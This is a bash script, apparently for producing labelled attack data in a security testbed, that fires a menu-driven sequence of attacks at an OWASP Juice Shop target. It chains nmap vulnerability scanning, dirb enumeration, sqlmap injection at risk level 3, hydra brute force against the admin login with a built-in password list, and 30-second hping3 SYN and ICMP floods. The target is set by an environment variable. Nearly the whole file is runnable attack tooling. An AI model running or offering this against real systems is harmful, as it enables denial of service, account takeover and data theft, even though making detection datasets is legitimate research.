#!/bin/bash

# Unified Attack Tools Script for Security Testbed Dataset Generation
# Focus: Meaningful attacks with proper labeling for correlation analysis

set -euo pipefail

TARGET_IP="${TARGET_IP:-100.64.0.20}"
LOG_DIR="/logs"
WORDLIST="/tmp/wordlist.txt"

# Create directories and wordlist
mkdir -p "$LOG_DIR"
cat > "$WORDLIST" << EOF
admin
password
123456
password123
admin123
root
test
guest
user
wordpress
letmein
welcome
qwerty
EOF

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [ATTACK] $1" | tee -a "$LOG_DIR/attack_timeline.log"
}

# Signal attack start/end for monitor correlation
signal_attack() {
    local attack_type="$1"
    local action="$2"  # START or END
    echo "ATTACK_MARKER|$attack_type|$action|$(date +'%Y-%m-%d %H:%M:%S.%3N')" | tee -a "$LOG_DIR/attack_markers.log"
    # Send signal packet for network correlation
    ping -c 1 -s 1400 "$TARGET_IP" >/dev/null 2>&1 || true
}

check_connectivity() {
    log "Checking connectivity to $TARGET_IP:3000..."
    while ! timeout 5 bash -c "</dev/tcp/$TARGET_IP/3000" 2>/dev/null; do
        log "Waiting for target connectivity..."
        sleep 2
    done
    log "Target $TARGET_IP:3000 is reachable"
}

# Core attack functions with proper labeling
network_scan() {
    signal_attack "NMAP_SCAN" "START"
    log "Starting network reconnaissance scan"
    nmap -sS -sV -O -A --script vuln -p 3000 "$TARGET_IP" | tee "$LOG_DIR/nmap_scan.log"
    signal_attack "NMAP_SCAN" "END"
}

ddos_syn_flood() {
    signal_attack "SYN_FLOOD" "START"
    log "Starting SYN flood attack (30 seconds)"
    timeout 30 hping3 -S --flood -V -p 3000 "$TARGET_IP" | tee "$LOG_DIR/syn_flood.log" || true
    signal_attack "SYN_FLOOD" "END"
}

ddos_icmp_flood() {
    signal_attack "ICMP_FLOOD" "START"
    log "Starting ICMP flood attack (30 seconds)"
    timeout 30 hping3 -1 --flood -V "$TARGET_IP" | tee "$LOG_DIR/icmp_flood.log" || true
    signal_attack "ICMP_FLOOD" "END"
}

web_sql_injection() {
    signal_attack "SQL_INJECTION" "START"
    log "Testing SQL injection on Juice Shop"
    # Target Juice Shop's search functionality which is vulnerable to SQL injection
    sqlmap -u "http://$TARGET_IP:3000/rest/products/search?q=test" --batch --level=2 --risk=3 | tee "$LOG_DIR/sql_injection.log"
    signal_attack "SQL_INJECTION" "END"
}

juiceshop_bruteforce() {
    signal_attack "JUICESHOP_BRUTEFORCE" "START"
    log "Brute forcing Juice Shop login"
    hydra -l admin@juice-sh.op -P "$WORDLIST" "$TARGET_IP" http-post-form ":3000/rest/user/login:email=^USER^&password=^PASS^:Invalid" -V | tee "$LOG_DIR/juiceshop_bruteforce.log"
    signal_attack "JUICESHOP_BRUTEFORCE" "END"
}

web_directory_scan() {
    signal_attack "DIR_SCAN" "START"
    log "Directory enumeration scan on Juice Shop"
    dirb "http://$TARGET_IP:3000/" /usr/share/dirb/wordlists/common.txt | tee "$LOG_DIR/directory_scan.log"
    signal_attack "DIR_SCAN" "END"
}

run_attack_sequence() {
    log "=== Starting coordinated attack sequence ==="
    
    check_connectivity
    
    log "Phase 1: Reconnaissance"
    network_scan
    web_directory_scan
    
    log "Phase 2: Application attacks"
    web_sql_injection
    juiceshop_bruteforce
    
    log "Phase 3: Network attacks"
    ddos_syn_flood
    sleep 10  # Cool down period
    ddos_icmp_flood
    
    log "=== Attack sequence completed ==="
}

# Interactive menu
show_menu() {
    echo ""
    echo "=== Security Testbed Attack Tools ==="
    echo "Target: $TARGET_IP"
    echo ""
    echo "1) Network Scan"
    echo "2) SQL Injection Test"
    echo "3) Juice Shop Brute Force"
    echo "4) Directory Enumeration"
    echo "5) SYN Flood Attack"
    echo "6) ICMP Flood Attack"
    echo "7) Run Full Attack Sequence"
    echo "8) Show Attack Logs"
    echo "9) Exit"
    echo ""
}

# Main execution
main() {
    check_connectivity
    
    while true; do
        show_menu
        read -p "Select option [1-9]: " choice
        
        case $choice in
            1) network_scan ;;
            2) web_sql_injection ;;
            3) juiceshop_bruteforce ;;
            4) web_directory_scan ;;
            5) ddos_syn_flood ;;
            6) ddos_icmp_flood ;;
            7) run_attack_sequence ;;
            8) ls -la "$LOG_DIR/"*.log 2>/dev/null || echo "No logs found" ;;
            9) log "Exiting attack tools"; exit 0 ;;
            *) echo "Invalid option" ;;
        esac
    done
}

main "$@"